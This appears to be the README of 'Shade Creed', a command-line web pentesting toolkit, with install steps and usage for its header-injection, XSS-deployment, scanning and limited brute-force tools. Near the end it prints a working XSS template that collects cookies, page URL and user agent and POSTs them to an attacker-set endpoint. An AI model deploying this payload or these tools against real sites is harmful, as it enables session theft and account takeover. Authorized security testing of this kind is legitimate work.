## ✨ Overview
Shade Creed is a command-line penetration testing toolkit designed for web application assessment. It provides tools to inject custom headers, deploy and test XSS payloads, and scan for common vulnerabilities. Built with modularity in mind, it allows you to dynamically customize and deploy payloads for real-world testing scenarios.

**Version**: 0.13.7  
**Author**: shade - Sherifdeen Adesola   
**Platform**: Linux / Android & Cross platform compatible 

---

## ✨ Features
- Custom HTTP/HTTPS header injection (supports multiple methods)
- Dynamic XSS payload creation and deployment
- Lightweight vulnerability scanner
- Quick bruteforce setup
- Proxy support (basic)


---
## 📦 Installation
```bash
pip install shadecreed
```
---
## Additional packages : cloudflared && Chromium
**Installation:**
##### Android (termux)
```bash
pkg install cloudflared
``` 
```bash
pkg install x11-repo tur-repo chromium
```
##### Macos 
```bash
brew install cloudflared 
```
```bash
brew install --cask chromium
```
##### Windows
**cloudflared:**
1. Visit the official download page:
👉 https://developers.cloudflare.com/cloudflared/install-windows
2. Download the latest cloudflared-windows-amd64.exe.
3. Rename the downloaded file to cloudflared.exe.
4. Move it to a folder like C:\cloudflared\.
5. Add that folder to your System PATH:
Open System Properties > Environment Variables
Under System variables, find and edit Path
Add: C:\cloudflared\
6. Verify installation:
cloudflared --version

**chromium:**
1. Find a reliable source: Websites like [Woolyss](https://chromium.woolyss.com/download/) offer pre-built versions of Chromium. 
2. Download the appropriate version: Choose the correct 32-bit or 64-bit version for your system. 
3. Run the installer: Follow the on-screen instructions to install Chromium. 
4. Test the installation: Launch Chromium and verify that it opens and functions correctly.

##### Linux distros 

**Download the latest cloudflared binary:**
```bash 
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
```

**Make it executable:**
```bash
chmod +x cloudflared-linux-amd64
```

**Move it to a directory in your system PATH:**
```bash
sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared
```

**Verify installation:**
```bash
cloudflared --version
```

**For chromium installation, help yourself.**

---

## ⚙️ CLI Tools

### 1. `shadecreed`
#### Description:
Main entry point for the framework.

```bash
usage: shadecreed [-h] -u URL
```

**Options:**
- `-h`, `--help`         Show help message and exit
- `-u URL`, `--url URL`  Target URL to launch framework
- `-v`, `--version` Display version
---

### 2. `shadecreed-inject`
#### Description:
Injects custom headers into HTTP(S) requests.

```bash
usage: shadecreed-inject [-h] -u URL [-m {GET,POST,PUT,DELETE}] [-s HEADER] [-p PROXY] [-r REDIRECT]
```

**Options:**
- `-h`, `--help`                          Show help message and exit
- `-u URL`, `--url URL`                  Target URL
- `-m`, `--method` {GET,POST,PUT,DELETE}  HTTP method to use (default: GET)
- `-s HEADER`, `--header HEADER`         Path to custom headers JSON
- `-p PROXY`, `--proxy PROXY`            Proxy in format `host:port`
- `-r REDIRECT`, `--redirect REDIRECT`   true - allow redirect otherwise do not provide this flag
---

### 3. `shadecreed-xss`
#### Description:
Customize and deploy XSS payloads to dynamic endpoints.

```bash
usage: shadecreed-xss [-h] --url URL [--script SCRIPT] [--endpoint ENDPOINT]
```

**Options:**
- `-h`, `--help`              Show help message and exit
- `--url URL`                 Target URL
- `--script SCRIPT`           Path to XSS script template
- `--endpoint ENDPOINT`       Custom receiving endpoint

---

### 4. `shadecreed-scan`
#### Description:
Scans a target for vulnerabilities.

```bash
usage: shadecreed-scan [-h] --url URL
```

**Options:**
- `-h`, `--help`      Show help message and exit
- `--url URL`         Target URL

---
### 5. `shadecreed-brute`
#### Description: 
Run custom brute force on admin login pages.
```bash
shadecreed-brute [-h] --url URL --redirect [true]
```
⚠️ Note: To prevent abuse, it can only attempt 10 passwords.

**Options:**
- `-h`, `--help`  Show help message and exit
- `-u`, `--url`  Target URL
- `-r`, `--redirect` [true] - if you intend to allow redirects otherwise, do not provide this flag. 
---

## 📂 Example Commands

**Run the main framework:**
```bash
shadecreed -u https://example.com
```

**Inject custom header using POST:**
```bash
shadecreed-inject -u https://target.com/api -m POST -s headers.json -r true
```

**Deploy custom XSS script:**
```bash
shadecreed-xss --url https://target.com/page --script payload.js --endpoint https://mycustomendpoint.com/log
```

**Test custom endpoint:**
```bash
shadecreed-test <Custom_Endpoint>
```

**Scan a site for vulnerabilities:**
```bash
shadecreed-scan --url https://victim.com
```

**Perform custom bruteforce:**
```bash
shadecreed-brute --url https://myhome/admin --redirect true
```

---

## 🕷️ Custom XSS Template
You can craft custom XSS scripts using the `{{endpoint}}` placeholder which will be replaced during deployment:

```javascript
<script>
  var data = {
    cookies: document.cookie,
    location: window.location.href,
    userAgent: navigator.userAgent
  };
  fetch("{{endpoint}}", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
</script>
```

Save the above as `payload.js` and pass it using the `--script` flag.

---

## ⚠️ Disclaimer
Shade Creed is built for **educational** and **authorized security testing** only. The developer is not responsible for any misuse or illegal activity.

---

Goodluck Pentesting! ✨
